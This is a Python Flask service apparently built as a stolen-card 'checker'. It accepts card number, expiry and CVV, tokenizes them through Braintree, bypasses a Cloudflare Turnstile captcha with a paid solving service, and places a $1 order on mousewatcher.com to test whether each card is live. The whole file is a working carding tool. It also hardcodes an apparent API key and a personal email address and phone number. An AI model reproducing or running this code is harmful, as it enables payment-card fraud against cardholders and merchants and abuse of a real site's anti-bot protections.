from flask import Flask, request, jsonify
import re
import requests
import base64
import json
import time
import os

app = Flask(__name__)

CAPSOLVER_API_KEY = os.environ.get('CAPSOLVER_API_KEY', 'CAP-36BF001B18A46AC00BC2C165F2D9CBAC993998A167516A0BC5543A6DD46464AF')

def solve_turnstile():
    """Solve Cloudflare Turnstile using Capsolver API directly"""
    
    create_payload = {
        "clientKey": CAPSOLVER_API_KEY,
        "task": {
            "type": "AntiTurnstileTaskProxyLess",
            "websiteURL": "https://mousewatcher.com/orders",
            "websiteKey": "0x4AAAAAAAZeM8EG-HBKlL4B",
            "metadata": {"action": "order"}
        }
    }
    
    response = requests.post("https://api.capsolver.com/createTask", json=create_payload)
    result = response.json()
    
    if result.get("errorId"):
        raise Exception(f"Task creation failed: {result.get('errorDescription', 'Unknown error')}")
    
    task_id = result.get("taskId")
    
    for _ in range(30):
        time.sleep(2)
        get_payload = {
            "clientKey": CAPSOLVER_API_KEY,
            "taskId": task_id
        }
        response = requests.post("https://api.capsolver.com/getTaskResult", json=get_payload)
        result = response.json()
        
        if result.get("status") == "ready":
            return result.get("solution", {}).get("token")
        elif result.get("status") == "failed":
            raise Exception(f"Task failed: {result.get('errorDescription', 'Unknown error')}")
    
    raise Exception("Timeout waiting for captcha solution")

@app.route('/', methods=['GET'])
def home():
    return jsonify({
        'status': 'active',
        'endpoints': {
            '/check': 'POST or GET with cc parameter',
            'example': '/check?cc=4111111111111111|12|26|123'
        }
    })

@app.route('/check', methods=['GET', 'POST'])
def check_card():
    try:
        if request.method == 'GET':
            fullz = request.args.get('cc')
        else:
            data = request.get_json()
            fullz = data.get('cc') if data else request.form.get('cc')
        
        if not fullz:
            return jsonify({'error': 'CC required. Format: CC|MM|YY|CVV', 'example': '4111111111111111|12|26|123'}), 400
        
        cc, mes, ano, cvv = fullz.split("|")
        
        session = requests.Session()
        
        headers1 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        }
        
        response = session.get('https://mousewatcher.com', headers=headers1)
        csrf_token = re.search(r'<meta name="csrf-token" content="([^"]+)"', response.text).group(1)
        
        headers2 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/vnd.turbo-stream.html, text/html, application/xhtml+xml',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'x-csrf-token': csrf_token,
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'x-requested-with': 'XMLHttpRequest',
            'origin': 'https://mousewatcher.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://mousewatcher.com/',
            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        }
        
        session.post('https://mousewatcher.com/orders/totals', headers=headers2, json={'dates': ['2026-05-06']})
        
        headers3 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://mousewatcher.com/',
            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        }
        
        response = session.get('https://mousewatcher.com/orders/tokens', headers=headers3)
        jwt_token = response.json()['braintree_token']
        decoded = json.loads(base64.urlsafe_b64decode(jwt_token))
        auth = decoded['authorizationFingerprint']
        
        headers4 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
            'Content-Type': 'application/json',
            'sec-ch-ua-platform': '"Android"',
            'authorization': f'Bearer {auth}',
            'braintree-version': '2018-05-10',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'origin': 'https://assets.braintreegateway.com',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://assets.braintreegateway.com/',
            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        }
        
        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'dropin2',
                'sessionId': '38cfe742-91d5-4963-be3c-825f72b84fec',
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId business consumer purchase corporate } } } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'billingAddress': {'postalCode': '10001'},
                    },
                    'options': {'validate': False},
                },
            },
            'operationName': 'TokenizeCreditCard',
        }
        
        response = requests.post('https://payments.braintree-api.com/graphql', headers=headers4, json=json_data)
        tkn = response.json()['data']['tokenizeCreditCard']['token']
        
        turnstile_token = solve_turnstile()
        
        data = f'authenticity_token={csrf_token}&park=1&order[alert][restaurant_id]=297&order%5Balert%5D%5Balert_dates_attributes%5D%5B0%5D%5Bid%5D&order[alert][alert_dates_attributes][0][_destroy]=false&order[alert][alert_dates_attributes][0][date]=2026-05-06&order[alert][alert_dates_attributes][0][breakfast]=0&order[alert][alert_dates_attributes][0][lunch]=0&order[alert][alert_dates_attributes][0][dinner]=0&order[alert][alert_dates_attributes][0][dinner]=1&order[alert][alert_dates_attributes][0][dinner_has_range]=0&order[alert][alert_dates_attributes][0][dinner_party_size]=1&order%5Balert%5D%5Balert_dates_attributes%5D%5B1%5D%5Bid%5D&order[alert][alert_dates_attributes][1][_destroy]=false&order%5Balert%5D%5Balert_dates_attributes%5D%5B2%5D%5Bid%5D&order[alert][alert_dates_attributes][2][_destroy]=false&order[alert][email]=opdevildragon%40gmail.com&alert_phone=%28201%29+245-5464&order[alert][phone]=%2B12012455464&cf-turnstile-response={turnstile_token}&payment_nonce={tkn}&device_data=%7B%22correlation_id%22%3A%2238cfe742-91d5-4963-be3c-825f72b8%22%7D'
        
        headers5 = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Google Chrome";v="146"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://mousewatcher.com',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://mousewatcher.com/',
            'accept-language': 'en-IN,en;q=0.9,bn-IN;q=0.8,bn;q=0.7,en-GB;q=0.6,en-US;q=0.5',
        }
        
        response = session.post('https://mousewatcher.com/orders', headers=headers5, data=data)
        
        if '<div id="error_explanation">' in response.text:
            error_match = re.search(r'<label class="error">\s*(.*?)\s*</label>', response.text, re.DOTALL)
            error = error_match.group(1).strip() if error_match else 'Unknown error'
            return jsonify({'status': 'failed', 'error': error, 'card': f'{cc[-4:]}'}), 200
        
        return jsonify({
            'status': 'success',
            'message': 'Charged $1',
            'card': f'{cc[-4:]}',
            'token': tkn
        }), 200
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True)
